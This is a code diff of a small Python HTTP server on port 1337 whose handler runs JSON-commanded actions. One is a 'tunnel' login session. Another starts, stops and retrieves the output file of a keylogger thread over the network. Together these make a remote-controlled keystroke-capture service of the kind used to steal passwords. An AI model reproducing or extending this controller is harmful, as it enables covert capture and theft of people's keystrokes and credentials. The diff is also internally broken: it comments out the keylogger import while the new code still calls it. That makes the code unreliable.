@@ -5,8 +5,7 @@ PORT = 1337;
 
 import http.server as hs;
 from modules.Tunnel import tunnel;
-from modules.Keylogger import logger;
-from urllib.parse import urlparse;
+#from modules.Keylogger import logger
 import json;
 
 class CustomRequestHandler(hs.BaseHTTPRequestHandler):
@@ -20,13 +19,13 @@ class CustomRequestHandler(hs.BaseHTTPRequestHandler):
 		self.send_header("Content-Encoding","ASCII");
 		self.end_headers();
 
-		#stuff goes here
+		
 		
 		if self.data["user"] != self.client_address:
 			self.data["user"] = self.client_address;
 		
 		data = self.rfile.read(int(self.headers["content-length"]));
-		data = str(data).strip("b'").strip("'");
+		data = str(data).strip("b'").strip("'"); #Ask Jacques why we strip
 		data = json.loads(data);
 		
 		res = self.execute(data);
@@ -67,14 +66,17 @@ class CustomRequestHandler(hs.BaseHTTPRequestHandler):
 				ret = ret = tunnel_obj.login_session(url,extras);
 			self.data["tunnel_obj"] = tunnel_obj; #store tunnel object
 		elif action == "keylogger":
+			if "logger_obj" not in self.data.keys():
+				self.data["logger_obj"] = logger.LoggerThread();
+			logger_obj = self.data["logger_obj"]; #retrieve tunnel object
 			sub_act = params["sub_action"];
 			if sub_act == "start":
-				ret = logger.start();
+				ret = logger_obj.start();
 			elif sub_act == "stop":
-				ret = logger.stop();
+				ret = logger_obj.stop();
 			elif sub_act == "get":
-				ret = logger.get_file();
-		
+				ret = logger_obj.get_file();
+			self.data["logger_obj"] = logger_obj;
 		return(ret);
 
 if __name__ == "__main__":
